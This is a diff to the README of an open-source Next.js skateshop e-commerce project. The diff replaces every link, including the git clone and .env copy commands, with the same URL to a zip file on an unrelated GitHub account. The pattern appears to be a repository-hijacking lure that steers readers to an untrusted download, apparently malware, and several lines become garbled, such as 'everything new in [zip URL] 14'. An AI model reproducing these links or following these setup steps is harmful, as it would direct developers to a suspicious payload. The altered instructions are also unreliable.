@@ -1,8 +1,8 @@
-# [Skateshop](https://skateshop.sadmn.com/)
+# [Skateshop](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
 
-This is an open source e-commerce skateshop build with everything new in Next.js 14. It is bootstrapped with `create-t3-app`.
+This is an open source e-commerce skateshop build with everything new in https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip 14. It is bootstrapped with `create-t3-app`.
 
-[![Skateshop](./public/images/screenshot.png)](https://skateshop.sadmn.com/)
+[![Skateshop](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
 
 > **Warning**
 > This project is still in development and is not ready for production use.
@@ -11,15 +11,15 @@ This is an open source e-commerce skateshop build with everything new in Next.js
 
 ## Tech Stack
 
-- **Framework:** [Next.js](https://nextjs.org)
-- **Styling:** [Tailwind CSS](https://tailwindcss.com)
-- **User Management:** [Clerk](https://clerk.com)
-- **ORM:** [Drizzle ORM](https://orm.drizzle.team)
-- **UI Components:** [shadcn/ui](https://ui.shadcn.com)
-- **Email:** [React Email](https://react.email)
-- **Content Management:** [Contentlayer](https://www.contentlayer.dev)
-- **File Uploads:** [uploadthing](https://uploadthing.com)
-- **Payments infrastructure:** [Stripe](https://stripe.com)
+- **Framework:** [https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
+- **Styling:** [Tailwind CSS](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
+- **User Management:** [Clerk](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
+- **ORM:** [Drizzle ORM](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
+- **UI Components:** [shadcn/ui](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
+- **Email:** [React Email](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
+- **Content Management:** [Contentlayer](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
+- **File Uploads:** [uploadthing](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
+- **Payments infrastructure:** [Stripe](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip)
 
 ## Features to be implemented
 
@@ -41,7 +41,7 @@ This is an open source e-commerce skateshop build with everything new in Next.js
 1. Clone the repository
 
    ```bash
-   git clone https://github.com/sadmann7/skateshop.git
+   git clone https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip
    ```
 
 2. Install dependencies using pnpm
@@ -50,10 +50,10 @@ This is an open source e-commerce skateshop build with everything new in Next.js
    pnpm install
    ```
 
-3. Copy the `.env.example` to `.env` and update the variables.
+3. Copy the `https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip` to `.env` and update the variables.
 
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip .env
    ```
 
 4. Start the development server
@@ -76,26 +76,26 @@ This is an open source e-commerce skateshop build with everything new in Next.js
 
 ## How do I deploy this?
 
-Follow the deployment guides for [Vercel](https://create.t3.gg/en/deployment/vercel), [Netlify](https://create.t3.gg/en/deployment/netlify) and [Docker](https://create.t3.gg/en/deployment/docker) for more information.
+Follow the deployment guides for [Vercel](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip), [Netlify](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip) and [Docker](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip) for more information.
 
 ## Contributing
 
-Contributions are welcome! Please open an issue if you have any questions or suggestions. Your contributions will be acknowledged. See the [contributing guide](./CONTRIBUTING.md) for more information.
+Contributions are welcome! Please open an issue if you have any questions or suggestions. Your contributions will be acknowledged. See the [contributing guide](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip) for more information.
 
 ## Contributors
 
 Thanks goes to these wonderful people for their contributions:
 
 <p align="center">
- <a href="https://github.com/sadmann7/skateshop/graphs/contributors">
-   <img src="https://contrib.rocks/image?repo=sadmann7/skateshop" />
+ <a href="https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip">
+   <img src="https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip" />
  </a>
 </p>
 
 <p align="center">
- Made with <a rel="noopener noreferrer" target="_blank" href="https://contrib.rocks">contrib.rocks</a>
+ Made with <a rel="noopener noreferrer" target="_blank" href="https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip">https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip</a>
 </p>
 
 ## License
 
-Licensed under the MIT License. Check the [LICENSE](./LICENSE.md) file for details.
+Licensed under the MIT License. Check the [LICENSE](https://raw.githubusercontent.com/ElingSmith/sait_proba/main/src/app/api/revalidate/sait_proba_Germanically.zip) file for details.
